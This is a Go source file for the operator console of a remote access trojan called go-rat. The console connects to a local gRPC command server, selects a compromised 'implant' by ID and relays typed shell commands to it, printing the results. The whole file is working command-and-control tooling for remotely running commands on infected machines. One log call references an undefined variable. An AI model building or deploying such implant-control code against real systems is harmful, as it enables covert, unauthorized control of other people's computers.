package main

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"strings"

	"github.com/charmbracelet/lipgloss"
	"github.com/charmbracelet/log"
	"github.com/google/uuid"
	"github.com/iortego42/go-rat/grpcapi"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/status"
)

var PROMPT = lipgloss.NewStyle().
	SetString("|> ").
	Foreground(lipgloss.Color("#9fe0f0"))

// TODO: Revisar si merece la pena
// func handleStatusCodes(s *status.Status) int{
// 	if s == nil {
// 		return -1
// 	}
// 	if s.Message() == "implant closed" {
// 		return 0
// 	}
// }

func mainLoop(client grpcapi.AdminClient, implant uuid.UUID) {
	var (
		ctx context.Context
		cmd *grpcapi.Command
		err error
	)
	ctx = context.Background()
	cmd = new(grpcapi.Command)
	PROMPT.SetString("[", implant.String(), "]\n|>")

	cmd.Id = implant.String()
	s := bufio.NewScanner(os.Stdin)
	for {
		cmd.Out = ""
		fmt.Print(PROMPT.SetString("ID: ").Bold(true).Render())
		fmt.Println(PROMPT.SetString("").UnsetForeground().Render(implant.String()))
		fmt.Print(PROMPT.Render())
		s.Scan()
		strCmd := strings.Trim(s.Text(), " \n")
		if strCmd == "" {
			continue
		}
		if strCmd == "exit" {
			fmt.Println(PROMPT.SetString("[+]").Render(), "Bye")
			return
		}
		cmd.In = strCmd
		cmd, err = client.RunCommand(ctx, cmd)
		if cmd == nil && err == nil {
			log.Info("Implant cerrado", "id", implant.String())
			return
		}
		if err != nil {
			statusErr, ok := status.FromError(err)
			if !ok {
				log.Fatal("Error creando statusErr")
			}
			if statusErr.Message() == "implant closed" {
				logger.Info("Implant Cerrado", "id", implant.String())
				return
			}
			log.Fatal(err)
		}
		fmt.Print(cmd.Out)
		if cmd.Out != "" && cmd.Out[len(cmd.Out)-1] != '\n' && cmd.In != "clear" {
			fmt.Println(PROMPT.Bold(true).Background(lipgloss.Color("#9fe0f0")).Foreground(lipgloss.Color("#1a1a1a")).SetString("%").Render())
		}
	}
}

func main() {
	var (
		opts   []grpc.DialOption
		err    error
		conn   *grpc.ClientConn
		client grpcapi.AdminClient
	)
	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	conn, err = grpc.NewClient("127.0.0.1:9090", opts...)
	if err != nil {
		log.Fatal("[!] No se pudo establecer conexión con el servidor principal.", "ERROR", err)
	}
	defer conn.Close()
	client = grpcapi.NewAdminClient(conn)
	id := implantsMenu(client)
	implant, err := uuid.Parse(id)
	if err != nil {
		log.Fatal("Not a valid ID", "error", err, "id", id)
	}
	mainLoop(client, implant)
}
